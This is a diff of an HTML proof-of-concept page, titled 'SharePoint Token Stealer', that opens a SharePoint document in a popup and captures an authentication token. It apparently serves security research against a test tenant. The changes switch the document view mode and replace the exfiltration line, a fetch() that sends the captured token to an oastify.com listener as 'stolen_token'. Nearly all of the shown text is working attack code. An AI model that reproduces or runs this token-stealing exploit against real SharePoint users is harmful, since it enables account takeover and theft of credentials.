@@ -1,6 +1,6 @@
 <!DOCTYPE html>
 <html>
-<head> <title>SharePoint Popup Exploit V8</title> </head>
+<head> <title>SharePoint Popup Exploit V9</title> </head>
 <body>
     <h1>SharePoint Token Stealer (Popup Method)</h1>
     <button onclick="startExploit()">Step 1: Open Target & Attack</button>
@@ -9,8 +9,8 @@
 
     <script>
         // TARGET CONFIGURATION
-        // Use 'embedview' to load the editor directly (avoids nested iframe issues of 'default')
-        const targetUrl = "https://shiscolinotests-my.sharepoint.com/personal/shiscolino_shiscolinotests_onmicrosoft_com/_layouts/15/Doc.aspx?sourcedoc={aafd58b8-f1a2-439e-94f0-d4ac217eea09}&action=embedview";
+        // 'interactivepreview' is the specific mode for Add-ins, so it MUST support token requests.
+        const targetUrl = "https://shiscolinotests-my.sharepoint.com/personal/shiscolino_shiscolinotests_onmicrosoft_com/_layouts/15/Doc.aspx?sourcedoc={aafd58b8-f1a2-439e-94f0-d4ac217eea09}&action=interactivepreview";
         const targetOrigin = "https://shiscolinotests-my.sharepoint.com";
         const exploitId = "HACKER_POPUP";
         let popup = null;
@@ -102,7 +102,7 @@
 
                 if (token) {
                     log("SUCCESS! Token found.");
-                    fetch('https://gh172msg2ynnsup0ycblcdwomfs6g24r.oastify.com/?stolen_token=' + encodeURIComponent(token), { mode: 'no-cors' });
+                    fetch('https://cm237ixc7usjxquw38ghh91krbx2ls9h.oastify.com/?stolen_token=' + encodeURIComponent(token), { mode: 'no-cors' });
                 } else {
                     log("ERROR: Message received but Token field is empty or named differently.");
                 }
